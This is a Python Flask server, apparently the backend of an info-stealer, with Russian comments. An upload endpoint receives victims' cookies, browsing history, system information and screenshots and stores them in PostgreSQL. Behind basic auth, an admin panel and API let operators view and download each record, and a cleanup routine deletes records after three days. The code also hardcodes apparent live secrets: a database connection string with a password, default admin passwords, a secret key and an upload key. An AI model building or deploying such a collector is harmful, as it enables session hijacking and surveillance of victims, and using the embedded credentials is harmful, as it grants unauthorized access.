import os
import json
import base64
import logging
from datetime import datetime, timedelta, timezone
from flask import Flask, request, render_template, abort, jsonify, Response
from flask_cors import CORS
from flask_httpauth import HTTPBasicAuth
import psycopg
from psycopg.rows import dict_row
from io import BytesIO
from PIL import Image
import io
import sys

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app, resources={r"/api/*": {"origins": "*"}})
app.secret_key = os.getenv("SECRET_KEY", "c1e4b3a0d5f8c7e2b3a0d5f8c7e2b3a0d5f8c7e2b3a0d5f8c7e2b3a0d5f8c7e2")
auth = HTTPBasicAuth()

# Админ-аккаунты
ADMINS = {
    os.getenv("ADMIN_USER1", "angel0chek"): os.getenv("ADMIN_PASS1", "angel0chek"),
    os.getenv("ADMIN_USER2", "winter"): os.getenv("ADMIN_PASS2", "winter")
}

UPLOAD_API_KEY = os.getenv("UPLOAD_API_KEY", "d3b07384d113edec49eaa6238ad5ff00")
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://neondb_owner:npg_FK3RL4ZGAXin@ep-frosty-wildflower-af3ua5fw-pooler.c-2.us-west-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require")

# Проверка обязательных переменных окружения
if not DATABASE_URL:
    logger.error("DATABASE_URL environment variable is not set!")
    raise RuntimeError("DATABASE_URL must be set in env")

# --- Basic auth ---
@auth.verify_password
def verify(username, password):
    if username in ADMINS and ADMINS[username] == password:
        return username
    logger.warning(f"Failed login attempt for user: {username}")
    return None

# --- Image compression ---
def compress_image(image_data, quality=60):
    try:
        img = Image.open(io.BytesIO(image_data))
        if img.mode != 'RGB':
            img = img.convert('RGB')
            
        output = io.BytesIO()
        img.save(output, format='JPEG', quality=quality, optimize=True)
        return output.getvalue()
    except Exception as e:
        logger.error(f"Image compression failed: {e}")
        return image_data

# --- DB helpers ---
def get_conn():
    try:
        conn = psycopg.connect(DATABASE_URL, row_factory=dict_row)
        logger.info("Database connection established")
        return conn
    except psycopg.OperationalError as e:
        logger.error(f"Database connection failed: {e}")
        raise

def init_db():
    try:
        with get_conn() as conn:
            with conn.cursor() as cur:
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS users (
                        id SERIAL PRIMARY KEY,
                        username TEXT,
                        cookies JSONB,
                        history JSONB,
                        system_info JSONB,
                        screenshot BYTEA,
                        timestamp TIMESTAMPTZ
                    );
                    
                    CREATE INDEX IF NOT EXISTS idx_timestamp ON users(timestamp);
                ''')
                conn.commit()
                logger.info("Database initialized successfully")
    except Exception as e:
        logger.error(f"Database initialization failed: {e}")

def cleanup_old_data(days=3):
    try:
        with get_conn() as conn:
            with conn.cursor() as cur:
                delete_before = datetime.now(timezone.utc) - timedelta(days=days)
                cur.execute("DELETE FROM users WHERE timestamp < %s", (delete_before,))
                conn.commit()
                deleted_count = cur.rowcount
                logger.info(f"Cleaned up {deleted_count} old records")
                return deleted_count
    except Exception as e:
        logger.error(f"Cleanup failed: {e}")
        return 0

# Инициализация БД при старте
init_db()

# --- Routes ---
@app.route('/')
@auth.login_required
def admin_panel():
    try:
        with get_conn() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT id, username, timestamp FROM users ORDER BY id DESC LIMIT 200")
                rows = cur.fetchall()
                users = [{
                    "id": r["id"], 
                    "username": r["username"], 
                    "timestamp": r["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if r["timestamp"] else ""
                } for r in rows]
                return render_template('admin.html', users=users)
    except Exception as e:
        logger.error(f"Admin panel error: {e}")
        return "Internal Server Error", 500

@app.route('/user/<int:user_id>')
@auth.login_required
def view_user(user_id):
    try:
        with get_conn() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT id, username, timestamp, 
                    (screenshot IS NOT NULL) as has_screenshot 
                    FROM users WHERE id = %s
                """, (user_id,))
                row = cur.fetchone()
                if not row:
                    abort(404)
                user_meta = {
                    "id": row["id"], 
                    "username": row["username"], 
                    "timestamp": (row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""), 
                    "has_screenshot": row["has_screenshot"]
                }
                return render_template('user_detail.html', user=user_meta)
    except Exception as e:
        logger.error(f"View user error: {e}")
        return "Internal Server Error", 500

@app.route('/api/data/<int:user_id>')
@auth.login_required
def api_user_data(user_id):
    try:
        with get_conn() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT cookies, history, system_info, timestamp 
                    FROM users WHERE id = %s
                """, (user_id,))
                row = cur.fetchone()
                if not row:
                    return jsonify({"error": "not found"}), 404
                return jsonify({
                    "cookies": row["cookies"] or [],
                    "history": row["history"] or [],
                    "system_info": row["system_info"] or {},
                    "timestamp": row["timestamp"].strftime("%Y-%m-%d %H:%M:%S") if row["timestamp"] else ""
                })
    except Exception as e:
        logger.error(f"API user data error: {e}")
        return jsonify({"error": "server error"}), 500

@app.route('/screenshot/<int:user_id>')
@auth.login_required
def screenshot(user_id):
    try:
        with get_conn() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT screenshot FROM users WHERE id = %s", (user_id,))
                row = cur.fetchone()
                if not row or not row["screenshot"]:
                    abort(404)
                img_bytes = row["screenshot"]
                return Response(img_bytes, mimetype='image/jpeg')
    except Exception as e:
        logger.error(f"Screenshot error: {e}")
        return "Internal Server Error", 500

@app.route('/api/upload', methods=['POST'])
def api_upload():
    # Проверка API ключа
    key = request.headers.get("X-API-KEY")
    if not UPLOAD_API_KEY or key != UPLOAD_API_KEY:
        logger.warning(f"Unauthorized upload attempt with key: {key}")
        return jsonify({"error": "unauthorized"}), 401

    # Парсинг JSON
    try:
        data = request.get_json()
    except Exception as e:
        logger.error(f"Invalid JSON: {e}")
        return jsonify({"error": "invalid json"}), 400

    # Извлечение данных
    username = data.get("username", "unknown")
    cookies = data.get("cookies", [])
    history = data.get("history", [])
    system_info = data.get("systemInfo", {})
    screenshot_base64 = data.get("screenshot")
    
    logger.info(f"Upload request from: {username}")
    logger.info(f"Cookies: {len(cookies)}, History: {len(history)}")

    # Обработка скриншота
    screenshot_bytes = None
    if screenshot_base64:
        try:
            screenshot_bytes = base64.b64decode(screenshot_base64)
            logger.info(f"Original screenshot size: {len(screenshot_bytes)} bytes")
            
            # Сжатие изображения
            screenshot_bytes = compress_image(screenshot_bytes)
            logger.info(f"Compressed screenshot size: {len(screenshot_bytes)} bytes")
        except Exception as e:
            logger.error(f"Screenshot processing error: {e}")
            # Продолжаем без скриншота

    # Текущее время с часовым поясом
    timestamp = datetime.now(timezone.utc)

    # Вставка данных в БД
    try:
        with get_conn() as conn:
            with conn.cursor() as cur:
                # Явное преобразование в JSON
                cookies_json = json.dumps(cookies)
                history_json = json.dumps(history)
                system_info_json = json.dumps(system_info)
                
                # SQL запрос
                query = """
                    INSERT INTO users 
                    (username, cookies, history, system_info, screenshot, timestamp) 
                    VALUES 
                    (%s, %s, %s, %s, %s, %s)
                    RETURNING id
                """
                
                # Параметры запроса
                params = (
                    username, 
                    cookies_json, 
                    history_json, 
                    system_info_json, 
                    screenshot_bytes, 
                    timestamp
                )
                
                logger.debug(f"Executing query: {query}")
                logger.debug(f"Params: {params[:4]}...")  # Не логируем бинарные данные
                
                # Выполнение запроса
                cur.execute(query, params)
                new_id = cur.fetchone()[0]
                conn.commit()
                
                logger.info(f"Data inserted successfully, ID: {new_id}")
                return jsonify({"status": "ok", "id": new_id})
                
    except psycopg.Error as e:
        logger.error(f"Database error: {e}")
        return jsonify({
            "error": "db error",
            "detail": str(e),
            "pgcode": e.pgcode
        }), 500
        
    except Exception as e:
        logger.exception("Unexpected error in api_upload")
        return jsonify({"error": "server error", "detail": str(e)}), 500

@app.route('/api/cleanup', methods=['POST'])
@auth.login_required
def api_cleanup():
    try:
        count = cleanup_old_data()
        return jsonify({"status": "success", "deleted": count})
    except Exception as e:
        logger.error(f"Cleanup error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/health')
def health_check():
    try:
        # Проверка подключения к БД
        with get_conn() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT 1")
                result = cur.fetchone()
                if result and result[0] == 1:
                    return jsonify({"status": "ok", "database": "connected"})
        return jsonify({"status": "error", "database": "unavailable"}), 500
    except Exception as e:
        return jsonify({"status": "error", "detail": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
